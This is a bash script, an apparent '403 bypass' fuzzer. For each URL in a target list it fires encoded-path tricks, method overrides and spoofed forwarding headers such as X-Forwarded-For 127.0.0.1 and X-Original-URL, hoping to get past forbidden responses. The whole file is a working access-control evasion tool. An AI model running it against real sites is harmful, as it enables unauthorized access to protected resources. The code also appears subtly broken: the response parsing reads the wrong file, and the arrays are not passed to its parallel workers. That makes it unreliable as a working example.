#!/usr/bin/env bash
# Ultimate 403 Bypass Fuzzer
# Usage:
#   ./ultimate-403-bypass.sh targets.txt [--all]
# Notes:
#   - By default, prints only interesting (non-403 / non-000) results.
#   - Use --all to print everything.
#   - Requires: curl. Optional: parallel (GNU parallel) for speed.
#   - Adds results to report: results_403bypass_YYYYmmdd_HHMMSS.csv

set -euo pipefail

TARGET_FILE="${1:-}"
PRINT_ALL="${2:-}"
[ -z "$TARGET_FILE" ] && { echo "Usage: $0 targets.txt [--all]"; exit 1; }
[ ! -f "$TARGET_FILE" ] && { echo "File not found: $TARGET_FILE"; exit 1; }

TS="$(date +%Y%m%d_%H%M%S)"
REPORT="results_403bypass_${TS}.csv"
TIMEOUT=15
UA="Mozilla/5.0 403-Bypass-Fuzzer"
CURL_BASE=(-sk --path-as-is --max-time "$TIMEOUT" -A "$UA" -H "Accept: */*")

# ---------------------------
# Payload sets
# ---------------------------

# Path suffix tricks (appended to base URL)
paths=(
  "/" "/." "//" "/%2e/" "/%2e" "/./" "/.?" "/?.." "/?%2e"
  "/..;" "/;/" "/;index" "/;/"
  "/%2f" "/%2f/" "/%2F" "/%2F/"
  "/%09" "/%20" "/%23" "/%23/" "/%00" "/%5c" "/\\"
  "/.#" "/#" "/?#" "/?/"
  "/%2e%2e/" "/..%2f" "/%2e%2e%2f"
  "/admin" "//admin" "/./admin" "/%2e/admin" "/admin..;/"
)

# Query/fragment padding
qpads=("?" "??" "?a=1" "?/" "?%2e" "?%2f" "?%09" "%23" "#foo")

# Methods to try
methods=("GET" "POST" "HEAD" "OPTIONS" "TRACE" "PUT" "PATCH" "DELETE")

# Method override headers (value -> array of headers to send)
declare -A method_overrides=(
  ["PUT"]="X-HTTP-Method-Override: PUT"
  ["DELETE"]="X-HTTP-Method-Override: DELETE"
  ["PATCH"]="X-HTTP-Method-Override: PATCH"
)

# Header tricks (single header injection)
headers=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Forwarded-For: 10.0.0.1"
  "X-Forwarded-For: 169.254.169.254"
  "X-Forwarded-Host: localhost"
  "X-Real-IP: 127.0.0.1"
  "X-Original-URL: /"
  "X-Rewrite-URL: /"
  "X-Forwarded-Proto: https"
  "X-Forwarded-Proto: http"
  "X-Forwarded-Port: 443"
  "X-Forwarded-Port: 80"
  "Forwarded: for=127.0.0.1;proto=http;host=localhost"
  "Referer: http://127.0.0.1/"
  "X-Host: 127.0.0.1"
  "X-Custom-IP-Authorization: 127.0.0.1"
)

# Case-variants (some stacks match case-sensitively)
case_headers=(
  "x-forwarded-for: 127.0.0.1"
  "X-FORWARDED-FOR: 127.0.0.1"
  "x-real-ip: 127.0.0.1"
  "X-ORIGINAL-URL: /"
  "x-rewrite-url: /"
)

# Duplicate headers (send the same header twice; some proxies trust the first/last)
dup_headers=(
  "X-Forwarded-For: 127.0.0.1;X-Forwarded-For: 8.8.8.8"
  "X-Forwarded-Proto: https;X-Forwarded-Proto: http"
)

# ---------------------------
# Helpers
# ---------------------------

url_join() {
  # Join base + suffix safely (avoid double scheme issues)
  local base="$1"; local suf="$2"
  # If suffix already contains a fragment or query-only, just append
  if [[ "$suf" == \?* || "$suf" == "#"* || "$suf" == "%23"* ]]; then
    echo "${base}${suf}"
  else
    # Otherwise ensure single slash join if needed
    if [[ "$base" =~ /$ || "$suf" =~ ^/ ]]; then
      echo "${base}${suf}"
    else
      echo "${base}/${suf}"
    fi
  fi
}

curl_probe() {
  local method="$1"; shift
  local url="$1"; shift
  # Remaining args are -H "Header: value" etc.
  local extra=("$@")

  # capture: code, size, time, redirect_url (if any)
  curl "${CURL_BASE[@]}" -X "$method" "${extra[@]}" "$url" \
    -w "HTTP_CODE:%{http_code} SIZE:%{size_download} TIME:%{time_total} REDIR:%{redirect_url}\n" \
    -o /tmp/403b_body.$$ 2>/tmp/403b_err.$$
  local meta
  meta="$(tail -n1 /tmp/403b_body.$$)"
  # If last line doesn't contain HTTP_CODE, add newline then append it
  if [[ "$meta" != HTTP_CODE:* ]]; then
    meta="$(cat /tmp/403b_body.$$; echo)"
  fi
  # Extract code/size/time
  local code size time redir
  code="$(echo "$meta" | sed -n 's/.*HTTP_CODE:\([0-9-]*\).*/\1/p')"
  size="$(echo "$meta" | sed -n 's/.*SIZE:\([0-9.]*\).*/\1/p')"
  time="$(echo "$meta" | sed -n 's/.*TIME:\([0-9.]*\).*/\1/p')"
  redir="$(echo "$meta" | sed -n 's/.*REDIR:\(.*\)$/\1/p')"

  # Return values via stdout as CSV fields
  echo "$code,$size,$time,$redir"
}

print_or_skip() {
  local code="$1"
  if [[ "$PRINT_ALL" == "--all" ]]; then
    return 0
  fi
  # Show only interesting (non-403, non-000)
  [[ "$code" != "403" && "$code" != "000" ]]
}

report_line() {
  local target="$1"; local vector="$2"; local value="$3"; local method="$4"; local code="$5"; local size="$6"; local time="$7"; local redir="$8"
  echo "\"$target\",\"$vector\",\"$value\",\"$method\",\"$code\",\"$size\",\"$time\",\"$redir\"" >> "$REPORT"
}

headerize() {
  # turn "A: b;C: d" into (-H "A: b" -H "C: d")
  local in="$1"; local out=()
  IFS=';' read -r -a parts <<< "$in"
  for p in "${parts[@]}"; do
    out+=(-H "$p")
  done
  printf "%s\n" "${out[@]}"
}

# ---------------------------
# Init report
# ---------------------------
echo "target,vector,value,method,code,size,time,redirect" > "$REPORT"

# ---------------------------
# Worker per target
# ---------------------------
worker() {
  local target="$1"

  # Paths
  for p in "${paths[@]}"; do
    local url; url="$(url_join "$target" "$p")"
    local res; res="$(curl_probe "GET" "$url")"
    IFS=',' read -r code size tm redir <<< "$res"
    if print_or_skip "$code"; then
      printf "[PATH ] %-60s => %s (size=%s time=%ss)\n" "$url" "$code" "$size" "$tm"
    fi
    report_line "$target" "path" "$p" "GET" "$code" "$size" "$tm" "$redir"
    # query/fragment pads
    for q in "${qpads[@]}"; do
      local u2; u2="$(url_join "$url" "$q")"
      res="$(curl_probe "GET" "$u2")"
      IFS=',' read -r code size tm redir <<< "$res"
      if print_or_skip "$code"; then
        printf "[PATH?] %-60s => %s (size=%s time=%ss)\n" "$u2" "$code" "$size" "$tm"
      fi
      report_line "$target" "path+pad" "$p$q" "GET" "$code" "$size" "$tm" "$redir"
    done
  done

  # Methods on root
  for m in "${methods[@]}"; do
    local res; res="$(curl_probe "$m" "$target")"
    IFS=',' read -r code size tm redir <<< "$res"
    if print_or_skip "$code"; then
      printf "[METH ] %-8s %-48s => %s (size=%s time=%ss)\n" "$m" "$target" "$code" "$size" "$tm"
    fi
    report_line "$target" "method" "/" "$m" "$code" "$size" "$tm" "$redir"
    # method overrides
    for ov in "${!method_overrides[@]}"; do
      # Only apply override when base method is GET/POST
      if [[ "$m" == "GET" || "$m" == "POST" ]]; then
        hdr="${method_overrides[$ov]}"
        mapfile -t ovh < <(headerize "$hdr")
        res="$(curl_probe "$m" "$target" "${ovh[@]}")"
        IFS=',' read -r code size tm redir <<< "$res"
        if print_or_skip "$code"; then
          printf "[OVR  ] %s via %s %-35s => %s (size=%s)\n" "$ov" "$m" "$target" "$code" "$size"
        fi
        report_line "$target" "method-override" "$ov" "$m" "$code" "$size" "$tm" "$redir"
      fi
    done
  done

  # Single headers
  for h in "${headers[@]}"; do
    mapfile -t hs < <(headerize "$h")
    local res; res="$(curl_probe "GET" "$target" "${hs[@]}")"
    IFS=',' read -r code size tm redir <<< "$res"
    if print_or_skip "$code"; then
      printf "[HEAD ] %-32s => %s (size=%s time=%ss)\n" "$h" "$code" "$size" "$tm"
    fi
    report_line "$target" "header" "$h" "GET" "$code" "$size" "$tm" "$redir"
  done

  # Case-variant headers
  for h in "${case_headers[@]}"; do
    mapfile -t hs < <(headerize "$h")
    local res; res="$(curl_probe "GET" "$target" "${hs[@]}")"
    IFS=',' read -r code size tm redir <<< "$res"
    if print_or_skip "$code"; then
      printf "[CASE ] %-32s => %s (size=%s time=%ss)\n" "$h" "$code" "$size" "$tm"
    fi
    report_line "$target" "header-case" "$h" "GET" "$code" "$size" "$tm" "$redir"
  done

  # Duplicate headers
  for combo in "${dup_headers[@]}"; do
    mapfile -t hs < <(headerize "$combo")
    local res; res="$(curl_probe 'GET' "$target" "${hs[@]}")"
    IFS=',' read -r code size tm redir <<< "$res"
    if print_or_skip "$code"; then
      printf "[DUP  ] %-32s => %s (size=%s time=%ss)\n" "$combo" "$code" "$size" "$tm"
    fi
    report_line "$target" "header-duplicate" "$combo" "GET" "$code" "$size" "$tm" "$redir"
  done
}

export -f worker url_join curl_probe print_or_skip report_line headerize
export REPORT PRINT_ALL TIMEOUT UA
export -f

echo "[*] Writing CSV report to: $REPORT"
echo "[*] Timeout per request: ${TIMEOUT}s"
echo

if command -v parallel >/dev/null 2>&1; then
  echo "[*] parallel found — running with concurrency"
  parallel -a "$TARGET_FILE" --will-cite -P 8 worker
else
  echo "[*] parallel not found — running sequentially"
  while read -r t; do
    [[ -z "$t" ]] && continue
    worker "$t"
  done < "$TARGET_FILE"
fi

echo
echo "[✓] Done. Report saved to: $REPORT"
